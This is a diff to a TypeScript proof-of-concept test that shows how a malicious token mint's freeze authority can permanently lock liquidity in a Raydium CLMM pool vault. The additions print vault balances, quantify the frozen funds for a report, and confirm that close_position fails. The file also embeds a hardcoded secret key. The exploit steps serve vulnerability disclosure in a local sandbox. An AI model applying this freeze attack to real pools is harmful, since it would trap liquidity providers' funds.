@@ -7,6 +7,7 @@ import {
   TOKEN_2022_PROGRAM_ID,
   MINT_SIZE,
   createInitializeMint2Instruction,
+  AccountLayout,
 } from "@solana/spl-token";
 import {
   Keypair,
@@ -18,8 +19,17 @@ import idl from "../target/idl/raydium_clmm.json";
 
 const ADMIN_SECRET = [222,63,238,12,143,134,142,4,161,175,48,183,228,55,162,51,74,95,237,146,26,147,77,52,54,75,28,199,42,240,0,96,35,202,64,63,172,172,171,217,58,31,133,50,107,206,250,166,98,247,161,237,96,59,107,111,178,144,88,198,240,205,45,4];
 
+// Decodes a token account and prints its balance + freeze state.
+// state: 0 = Uninitialized, 1 = Initialized, 2 = Frozen
+async function printVaultBalance(client: any, vault: PublicKey, label: string) {
+  const info = await client.getAccount(vault);
+  const decoded = AccountLayout.decode(info.data);
+  console.log(`   ${label}: amount=${decoded.amount.toString()}, state=${decoded.state}`);
+  return decoded.amount;
+}
+
 describe("freeze authority poc", () => {
-  it("Step 1-6: creates mint, amm_config, pool, deposits liquidity, freezes vault", async () => {
+  it("Step 1-8: creates mint, amm_config, pool, deposits liquidity, freezes vault, proves permanent lock", async () => {
     const context = await startAnchor(".", [], []);
     const client = context.banksClient;
     const payer = context.payer;
@@ -277,6 +287,11 @@ describe("freeze authority poc", () => {
     await client.processTransaction(openPositionTx);
     console.log("STEP 5c PASS: victim opened a real position and deposited real liquidity into the vaults");
 
+    // === [ADDED] BALANCE CHECK: prove real funds are sitting in the vaults ===
+    console.log("\n[BALANCE CHECK] Vaults after deposit:");
+    const vault0Before = await printVaultBalance(client, tokenVault0, "Vault0");
+    const vault1Before = await printVaultBalance(client, tokenVault1, "Vault1");
+
     // === STEP 6: attacker freezes the vault holding the malicious mint ===
     const fundAttackerTx = new Transaction().add(
       SystemProgram.transfer({
@@ -309,6 +324,11 @@ describe("freeze authority poc", () => {
     await client.processTransaction(freezeTx);
 
     console.log("STEP 6 PASS: attacker froze the pool vault:", freezeTargetVault.toBase58());
+
+    // === [ADDED] BALANCE CHECK: confirm the vault is now frozen (state 2) ===
+    console.log("\n[BALANCE CHECK] Vault state after freeze (2 = Frozen):");
+    await printVaultBalance(client, freezeTargetVault, "Frozen vault");
+
     // === STEP 7: victim attempts to withdraw — should fail because vault is frozen ===
     const decreaseLiquidityIx = await program.methods
       .decreaseLiquidityV2(
@@ -351,6 +371,38 @@ describe("freeze authority poc", () => {
       failureReason = String(err);
       console.log("STEP 7 CONFIRMED: withdrawal FAILED as expected. Vault is frozen, funds are stuck.");
       console.log("Failure reason:", failureReason);
+
+      // === [ADDED] IMPACT: quantify the funds that are now stuck ===
+      const frozenAmount = freezeTargetVault.equals(tokenVault0) ? vault0Before : vault1Before;
+      console.log(`\n[IMPACT] Funds permanently frozen: ${frozenAmount.toString()} raw units (${Number(frozenAmount) / 1e9} tokens, 9 decimals)`);
+      console.log("[IMPACT] Note: these are synthetic test tokens. For the report, translate this raw-unit amount");
+      console.log("[IMPACT] into the real token's decimals and USD price for the actual affected mainnet pool.");
+
+      // === [ADDED] PERMANENCE CHECK: prove there is no recovery path ===
+      console.log("\n[PERMANENCE CHECK] Attempting close_position on frozen vault...");
+      try {
+        const closePositionIx = await program.methods
+          .closePosition()
+          .accounts({
+            nftOwner: victim.publicKey,
+            positionNftMint: positionNftMint.publicKey,
+            positionNftAccount: positionNftAccount,
+            personalPosition: personalPosition,
+            systemProgram: SystemProgram.programId,
+            tokenProgram: TOKEN_2022_PROGRAM_ID,
+          })
+          .instruction();
+        const closeTx = new Transaction().add(closePositionIx);
+        const [bhClose] = await client.getLatestBlockhash();
+        closeTx.recentBlockhash = bhClose;
+        closeTx.feePayer = victim.publicKey;
+        closeTx.sign(victim);
+        await client.processTransaction(closeTx);
+        console.log("   ✗ close_position SUCCEEDED — unexpected, re-check whether funds are truly stuck");
+      } catch (closeErr) {
+        console.log("   ✓ close_position FAILED as expected — no recovery path exists, funds are permanently frozen");
+        console.log(`   Error: ${String(closeErr).substring(0, 300)}`);
+      }
     }
 
     if (!withdrawalFailed) {
